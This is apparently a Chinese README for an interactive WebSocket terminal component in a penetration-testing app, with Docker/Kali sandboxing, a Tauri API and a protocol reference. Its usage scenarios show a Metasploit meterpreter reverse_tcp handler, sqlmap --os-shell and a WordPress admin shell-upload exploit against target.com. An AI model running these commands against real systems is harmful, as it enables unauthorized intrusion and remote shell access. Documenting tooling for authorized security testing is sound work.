# Interactive Terminal - WebSocket 终端

## 概述

Interactive Terminal 提供了一个完整的 WebSocket 终端解决方案，支持持久化会话，非常适合需要交互式执行的工具，如 Metasploit (msfconsole)、SQLMap 会话等。

## 架构

```
┌─────────────────┐
│  Vue Component  │  (InteractiveTerminal.vue)
│   (xterm.js)    │
└────────┬────────┘
         │ WebSocket
         ↓
┌─────────────────┐
│ WebSocket Server│  (TerminalServer)
│   (Port 8765)   │
└────────┬────────┘
         │
         ↓
┌─────────────────┐
│ Session Manager │  (TerminalSessionManager)
└────────┬────────┘
         │
         ↓
┌─────────────────┐
│ Terminal Session│  (Docker/Host)
│   (bash/sh)     │
└─────────────────┘
```

## 核心特性

### 1. 持久化会话
- ✅ 会话在 WebSocket 断开后继续运行
- ✅ 支持会话重连（通过 session ID）
- ✅ 自动清理闲置会话（30分钟）

### 2. Docker 隔离
- ✅ 默认在 Docker 容器中运行
- ✅ 使用 Kali Linux 沙箱
- ✅ 安全隔离，资源限制

### 3. 完整终端体验
- ✅ 支持 ANSI 颜色和控制序列
- ✅ 支持光标移动和编辑
- ✅ 支持 Ctrl+C 等控制键
- ✅ 自动调整大小

## 快速开始

### 1. 后端配置

终端服务器会在首次使用时自动启动，默认监听 `127.0.0.1:8765`。

如需手动控制：

```typescript
// 启动服务器
await invoke('start_terminal_server', {
  config: {
    host: '127.0.0.1',
    port: 8765
  }
})

// 停止服务器
await invoke('stop_terminal_server')

// 获取状态
const status = await invoke('get_terminal_server_status')
console.log(status) // { running: true, session_count: 2 }
```

### 2. 前端使用

#### 基础用法

```vue
<template>
  <InteractiveTerminal />
</template>

<script setup>
import InteractiveTerminal from '@/components/Tools/InteractiveTerminal.vue'
</script>
```

#### 自定义配置

```vue
<template>
  <InteractiveTerminal
    :use-docker="true"
    docker-image="sentinel-sandbox:latest"
    shell="bash"
  />
</template>
```

#### 宿主机模式（不推荐）

```vue
<template>
  <InteractiveTerminal
    :use-docker="false"
    shell="bash"
  />
</template>
```

## 使用场景

### 场景 1: Metasploit Console

```typescript
// 1. 打开终端组件
<InteractiveTerminal />

// 2. 在终端中执行
$ msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0
```

### 场景 2: SQLMap 交互式会话

```bash
$ sqlmap -u "http://target.com/page?id=1" --batch --level=2
# SQLMap 会保持会话状态，可以继续执行其他命令
$ sqlmap -u "http://target.com/page?id=1" --os-shell
```

### 场景 3: 多步骤渗透测试

```bash
# 1. 信息收集
$ nmap -sV target.com

# 2. 目录扫描
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 3. 漏洞利用
$ msfconsole
msf6 > search wordpress
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

## API 参考

### Tauri 命令

#### start_terminal_server

启动 WebSocket 终端服务器。

```typescript
await invoke('start_terminal_server', {
  config?: {
    host: string,  // 默认 '127.0.0.1'
    port: number   // 默认 8765
  }
})
```

#### stop_terminal_server

停止终端服务器。

```typescript
await invoke('stop_terminal_server')
```

#### get_terminal_server_status

获取服务器状态。

```typescript
const status = await invoke('get_terminal_server_status')
// 返回: { running: boolean, session_count: number }
```

#### list_terminal_sessions

列出所有活动会话。

```typescript
const sessions = await invoke('list_terminal_sessions')
// 返回: Array<{
//   id: string,
//   state: 'Starting' | 'Running' | 'Stopped' | 'Error',
//   last_activity: number,  // 秒
//   use_docker: boolean
// }>
```

#### stop_terminal_session

停止指定会话。

```typescript
await invoke('stop_terminal_session', { sessionId: 'session-id' })
```

#### get_terminal_websocket_url

获取 WebSocket 连接 URL。

```typescript
const url = await invoke('get_terminal_websocket_url')
// 返回: 'ws://127.0.0.1:8765'
```

### WebSocket 协议

#### 连接

```javascript
const ws = new WebSocket('ws://127.0.0.1:8765')
```

#### 初始化消息

连接后立即发送配置：

```javascript
ws.send(JSON.stringify({
  use_docker: true,
  docker_image: 'sentinel-sandbox:latest',
  working_dir: '/workspace',
  env_vars: {},
  shell: 'bash'
}))
```

#### 接收会话 ID

```javascript
ws.onmessage = (event) => {
  if (event.data.startsWith('session:')) {
    const sessionId = event.data.substring(8)
    console.log('Session ID:', sessionId)
  }
}
```

#### 发送输入

```javascript
ws.send('ls -la\n')  // 文本命令
ws.send(new Uint8Array([3]))  // Ctrl+C
```

#### 接收输出

```javascript
ws.onmessage = (event) => {
  if (event.data instanceof Blob) {
    event.data.arrayBuffer().then(buffer => {
      const text = new TextDecoder().decode(buffer)
      console.log(text)
    })
  } else {
    console.log(event.data)
  }
}
```

## 配置选项

### TerminalSessionConfig

```rust
pub struct TerminalSessionConfig {
    /// 使用 Docker 容器
    pub use_docker: bool,
    
    /// Docker 镜像名称
    pub docker_image: String,
    
    /// 工作目录
    pub working_dir: Option<String>,
    
    /// 环境变量
    pub env_vars: HashMap<String, String>,
    
    /// Shell 类型
    pub shell: String,
}
```

**默认值**:
```rust
{
    use_docker: true,
    docker_image: "sentinel-sandbox:latest",
    working_dir: Some("/workspace"),
    env_vars: {},
    shell: "bash"
}
```

## 性能和限制

### 资源使用

| 项目 | 值 |
|------|-----|
| 内存占用（每会话） | ~50MB |
| WebSocket 连接 | 支持多个并发 |
| 最大会话数 | 无限制（建议 < 10） |
| 闲置超时 | 30 分钟 |
| 清理间隔 | 60 秒 |

### 限制

1. **会话重连**: 当前版本不支持断线重连到已有会话
2. **输出缓冲**: 大量输出可能有延迟
3. **二进制程序**: 某些二进制交互程序可能不完全兼容

## 故障排查

### 问题 1: 无法连接

**症状**: WebSocket 连接失败

**解决方案**:
```typescript
// 检查服务器状态
const status = await invoke('get_terminal_server_status')
if (!status.running) {
  await invoke('start_terminal_server')
}
```

### 问题 2: 终端无输出

**症状**: 命令执行但看不到输出

**可能原因**:
1. 命令需要交互式输入
2. 输出被缓冲

**解决方案**:
```bash
# 添加换行符强制刷新
echo "test" && echo ""

# 或使用 unbuffer (如果可用)
unbuffer your-command
```

### 问题 3: Docker 容器启动失败

**症状**: 会话创建失败

**解决方案**:
```bash
# 检查 Docker 是否运行
docker ps

# 检查镜像是否存在
docker images | grep sentinel-sandbox

# 重新构建镜像
./scripts/build-docker-sandbox.sh minimal
```

### 问题 4: 会话被自动清理

**症状**: 30分钟后会话断开

**解决方案**: 这是正常行为。如需保持会话，定期发送命令或调整超时时间。

修改超时（需要修改代码）:
```rust
// terminal/manager.rs
max_idle_duration: std::time::Duration::from_secs(3600), // 1 hour
```

## 安全考虑

### 1. 默认使用 Docker

所有命令默认在 Docker 容器中执行，提供隔离。

### 2. 本地监听

WebSocket 服务器默认只监听 `127.0.0.1`，不对外暴露。

### 3. 会话隔离

每个会话使用独立的容器，互不影响。

### 4. 自动清理

闲置会话自动清理，防止资源泄漏。

## 最佳实践

### 1. 使用 Docker 模式

```vue
<InteractiveTerminal :use-docker="true" />
```

### 2. 及时关闭会话

```typescript
// 组件卸载时自动关闭
onBeforeUnmount(() => {
  disconnect()
})
```

### 3. 监控会话数量

```typescript
const status = await invoke('get_terminal_server_status')
if (status.session_count > 5) {
  console.warn('Too many sessions')
}
```

### 4. 处理错误

```typescript
try {
  await connect()
} catch (error) {
  console.error('Connection failed:', error)
  // 显示错误提示
}
```

## 扩展功能

### 未来计划

- [ ] 会话持久化到数据库
- [ ] 断线重连支持
- [ ] 会话录制和回放
- [ ] 多用户协作
- [ ] 会话分享（只读）
- [ ] 自定义主题
- [ ] 快捷键配置
- [ ] 命令历史搜索

## 相关文档

- [Kali Docker README](./KALI_DOCKER_README.md)
- [Docker Sandbox Usage](./DOCKER_SANDBOX_USAGE.md)
- [xterm.js Documentation](https://xtermjs.org/)
- [WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)

## 示例代码

完整示例见：
- 后端: `src-tauri/sentinel-tools/src/terminal/`
- 前端: `src/components/Tools/InteractiveTerminal.vue`
- 命令: `src-tauri/src/commands/terminal_commands.rs`
